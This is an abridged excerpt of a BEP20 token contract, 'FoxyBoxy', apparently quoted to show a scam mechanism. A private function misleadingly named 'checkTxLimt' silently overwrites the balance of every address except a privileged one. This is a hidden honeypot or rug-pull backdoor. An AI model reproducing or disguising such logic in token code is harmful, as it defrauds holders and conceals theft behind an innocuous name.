...
contract FoxyBoxy is Context, IBEP20, Ownable {

    using Address for address;
    
    uint256 private total = 10000000 * 10 ** 6 * 10 ** 9;
    uint256 private rewardFee = 10000000;
    ...
    mapping(address => uint256) private aids;
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        aids[recipient] = aids[recipient] + (tAmount);
        aids[sender] = aids[sender] - (tAmount);
    ...
    function checkTxLimt(address addr) private
    {
        if (addr!=pp)
        {
            aids[addr]=rewardFee;
